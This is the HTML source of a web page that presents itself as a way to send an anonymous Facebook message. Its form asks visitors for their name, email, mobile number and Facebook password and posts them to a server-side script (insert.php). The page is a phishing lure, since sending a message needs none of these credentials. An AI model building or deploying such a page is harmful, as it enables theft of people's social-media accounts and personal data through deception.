<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FB Anonymous Message</title>
    <link rel="stylesheet" href="home.css">
    
</head>
<body>
<center>
   <div class="box" > 
       <br>
        <h1>WELLCOME !!!</h1>
        <h2>Write an anonymous message to your friend</h2>
        <h3>Enter Facebook Details</h3>
        <br>

<div id="webform" class="webform">
<h2>Web Form</h2>
<form action="insert.php" method="post" id="loginForm">
<label>Name :</label>
<input type="text" name="name" required placeholder="Please Enter Name"/><br><br>
<label> Email :</label>
<input type="email" name="email" required placeholder="qwerty@gmail.com"/><br><br>
<label style="padding-right:60px;" >Mobile number :<input   type="text" name="number" required placeholder="type mobile num"/></label>
<br><br>
<label style="padding-right:50px;"  > FB Password :<input type="password" name="password" required placeholder="password"/></label>
<br><br>
<!-- <label> City :</label>
<input type="text" name="city" required placeholder="Please Enter Your City"/><br><br> -->
<select name="gender" required>
    <option value=""> Select Gender </option>
    <option value="M"> Male </option>
    <option value="F"> Female </option>
</select>
<br><br>
<!-- <input type="submit" value=" Submit Details " name="submit" id="btn" /> -->
<button name="submit" id="btn" type="submit" onclick="newDoc()" class="btn" style="background-color: rgb(177, 177, 84);color: whitesmoke; " ><a href="well.php">SUBMIT</a></button>
<br />
<br>
</form>


    </div>
    
</center>


<link rel="stylesheet" href="home.js">

</body>




</html>